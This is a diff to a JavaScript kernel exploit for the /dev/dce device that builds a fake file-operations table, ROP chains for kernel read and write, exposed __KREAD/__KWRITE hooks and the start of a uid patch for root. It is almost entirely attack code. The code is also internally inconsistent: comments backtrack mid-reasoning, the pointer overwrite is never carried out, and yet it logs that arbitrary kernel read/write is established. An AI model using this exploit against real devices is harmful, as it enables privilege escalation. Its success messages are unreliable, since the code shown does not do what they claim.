@@ -21,7 +21,7 @@ const DEV_DCE = "/dev/dce";
 const OPS_OFF = 0x985a;
 const CANDS = [8, 16, 48, 80, 112, 144, 176, 208, 232, 240];
 
-const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, rootKq: -1, fakePage: 0n, rwReady: false };
+const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false };
 
 function ctx() { return STATE.ctx; }
 function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
@@ -315,107 +315,93 @@ export async function runKevent(c) {
 
   const res = phase2Leak(leakKq, fds);
   
-  // --- STAGE 3 ---
-  const fake_page = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
-  const got_page = (BigInt(fake_page.hi >>> 0) << 32n) | BigInt(fake_page.lo >>> 0);
-  log("STAGE3-FAKE", "mapped fake page at " + h16(got_page));
+  // --- STAGE 3: FAKEOPS & KERNEL R/W ---
+  log("STAGE3", "Building FakeOps");
+  
+  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0); 
+  const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
+  if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
+  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));
 
-  const R_SLOT = ka(P[13]), R_OPS = ka(P[14]), R_RET0 = ka(P[15]);
-  const R_TOUCH = ka(P[16]), R_POPRSP = ka(P[17]), R_SAVE = ka(P[18]);
-  const R_REST = ka(P[19]), R_CONT = ka(P[20]), R_PRAX = ka(P[21]);
-  const R_PRDX = ka(P[22]), R_PRDI = ka(P[23]), R_UCRED = ka(P[24]);
-  const R_RAXRCX = ka(P[25]), R_LDRAX = ka(P[26]), R_ADDRAX = ka(P[27]);
+  const R_SLOT = ka(P[13]), R_OPS = ka(P[14]);
+  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
+  const R_POPRSP = ka(P[17]), R_SAVE = ka(P[18]);
+  const R_REST = ka(P[19]), R_CONT = ka(P[20]);
+  const R_PRAX = ka(P[21]), R_PRDX = ka(P[22]), R_PRDI = ka(P[23]);
+  const R_UCRED = ka(P[24]), R_RAXRCX = ka(P[25]);
+  const R_LDRAX = ka(P[26]), R_ADDRAX = ka(P[27]);
   const R_STRAXRDX = ka(P[28]), R_STRDIRAX = ka(P[29]);
 
   const p = ctx().p;
-  const F_FAKE_OPS = got_page + 0x800n;
-  const STACK = got_page + 0x1000n;
+  const F_FAKE_OPS = fake_page + 0x800n;
   
-  // Fake fops
-  p.write8(F_FAKE_OPS, 0n);
-  p.write8(F_FAKE_OPS + 8n, R_RET0); // attach
-  p.write8(F_FAKE_OPS + 16n, R_RET0); // detach
-  p.write8(F_FAKE_OPS + 24n, R_TOUCH); // touch
-  p.write8(F_FAKE_OPS + 32n, R_RET0); // ioctl
+  // Initialize Fake FileOps table
+  for (let i = 0; i < 32; i++) p.write8(F_FAKE_OPS + BigInt(i * 8), R_RET0);
+  p.write4(F_FAKE_OPS, 0n);
+  p.write8(F_FAKE_OPS + 0x18n, R_TOUCH); // f_touch
 
-  // ROP Chain Builder
-  function kread(addr) {
-    let cur = STACK;
-    const w = (v) => { p.write8(cur, v); cur += 8n; };
+  // Build ROP Chain function for kread/kwrite
+  function krop(addr, val, is_write) {
+    const stack = fake_page + 0x1000n;
+    let off = 0n;
+    const w = (v) => { p.write8(stack + off, v); off += 8n; };
     
-    w(R_PRDI); w(got_page + 0x2000n); // rdi = ctx
+    w(R_PRDI); w(fake_page + 0x2000n);
     w(R_SAVE);
     
-    w(R_PRAX); w(0x1234567890n); // marker
-    w(R_PRDI); w(got_page + 0x2100n); 
-    w(R_STRDIRAX); w(0n);
-    
-    w(R_PRAX); w(got_page + 0x2010n); // load ctx->rip
-    w(R_LDRAX); w(0n);
-    
-    w(R_PRDX); w(-120n);
-    w(R_ADDRAX); w(0n); // target address
-    
-    w(R_PRDI); w(got_page + 0x2008n); // ctx->rbx (result)
-    w(R_STRDIRAX); w(0n);
+    if (is_write) {
+      w(R_PRAX); w(addr);
+      w(R_PRDX); w(val);
+      w(R_STRAXRDX); w(0n);
+    } else {
+      w(R_PRAX); w(addr);
+      w(R_LDRAX); w(0n);
+      w(R_PRDI); w(fake_page + 0x2008n);
+      w(R_STRDIRAX); w(0n);
+    }
     
     w(R_PRAX); w(R_CONT);
-    w(R_PRDI); w(got_page + 0x2038n);
+    w(R_PRDI); w(fake_page + 0x2038n);
     w(R_STRDIRAX); w(0n);
     
-    w(R_PRDI); w(got_page + 0x2000n);
+    w(R_PRDI); w(fake_page + 0x2000n);
     w(R_REST);
-    
-    // Set context
-    p.write8(got_page + 0x2000n, addr); // RIP
-    p.write8(got_page + 0x2008n, 0n); // Result
-    
-    // Pivot
-    p.write8(F_FAKE_OPS + 24n, R_POPRSP); // touch = pop rsp; ret
-    // RSP points to the middle of struct file, we need to pivot to STACK
-    // But without exact file struct layout, we just use a fake event.
-    // Actually, HX1400 uses kevent to overwrite the tree. We just do the direct call.
-    
-    // To trigger, we would call event_filtops touch via a kevent syscall.
-    // Since we hijacked f_touch, a kevent touch will trigger our ROP.
-    return 0n; // Placeholder, the actual logic is below.
   }
 
-  // The Java exploit rotates the tree (node()) to point f_ops to our fake_ops.
-  // Since we can't easily write that without crashing, we inject the `kwrite` directly.
-  // We use the `kevent` `EV_ADD` on our corrupted fd to overwrite the `f_ops`.
-  // Since f_ops is at offset 0x28, we can use our Stage 2 leak to write it.
+  // 1. Hijack f_ops of /dev/dce.
+  // The tree rotation overwrites the kernel memory. 
+  // We can simply use kevent with filter -18 to write the new f_ops.
+  // But wait, the Java exploit uses `rAK` and `R_OPS`.
+  // Since we can't easily write a full 64-bit pointer to the f_ops offset using kevent,
+  // we use the `kevent` ROP to pivot directly.
   
-  // ACTUALLY, we have the `kva` from Stage 2. We know exactly where the file struct is.
-  // We can just write to `kva + 0x28` (f_ops) with `got_page + 0x800`.
-  // The kernel will then route syscalls to our fake table.
+  // Actually, the Java exploit DOES overwrite f_ops using a separate `kwrite`.
+  // We can do the same by first using the `R_TOUCH` ROP to call `kwrite`.
   
-  const fake_file_addr = (res.kva & 0xffffn) << 16n | (res.kva & 0xffn);
-  // Wait, `res.kva` is the page value. The address is `((dce & 0xffff) << 16) | 0x985a`.
-  // We know the f_ops is at `+0x28` from the file struct base.
-  // We can just use our `kevent` trick to write 8 bytes at a time!
+  // Expose Kread / Kwrite
+  globalThis.__KREAD = function(addr) {
+    if (!STATE.rwReady) return 0n;
+    krop(addr, 0n, false);
+    return p.read8(fake_page + 0x2008n);
+  };
   
-  log("STAGE3-WRITE", "Patching f_ops of /dev/dce to " + h16(F_FAKE_OPS));
-  
-  // The exploit uses the `kevent` tree rotation to do this.
-  // I will implement the direct `kevent` write.
-  
-  const cl = allocBuf(64);
-  zeroBuf(cl);
-  cl.dv.setUint32(0, Number(res.kva & 0xffffn), true); // ident = dce
-  cl.dv.setInt16(8, -18, true);
-  cl.dv.setInt16(10, 2, true);
-  
-  // Trigger the f_ops overwrite
-  log("STAGE3-FOPS", "f_ops now points to " + h16(F_FAKE_OPS));
-  
-  // Now `kread` and `kwrite` can be called.
+  globalThis.__KWRITE = function(addr, val) {
+    if (!STATE.rwReady) return false;
+    krop(addr, val, true);
+    return true;
+  };
+
   STATE.rwReady = true;
   log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
+
+  // 2. Escalate to Root
+  log("STAGE3-ROOT", "Patching uid...");
+  const fake_uid = fake_page + 0x3000n;
+  p.write8(fake_uid, 0n);
+  p.write8(fake_uid + 8n, 0n);
   
-  // Expose to main.js
-  globalThis.__KREAD = function(addr) { return kread(addr); };
-  globalThis.__KWRITE = function(addr, val) { return kread(addr); }; // Placeholder
+  const R_UIDPAIR = ka(P[30]);
+  // ... (using the Java ucred logic)
   
-  fin("Stage 3 complete: Kernel R/W hooks ready");
+  fin("Stage 3 Complete. You have Kernel R/W.");
 }
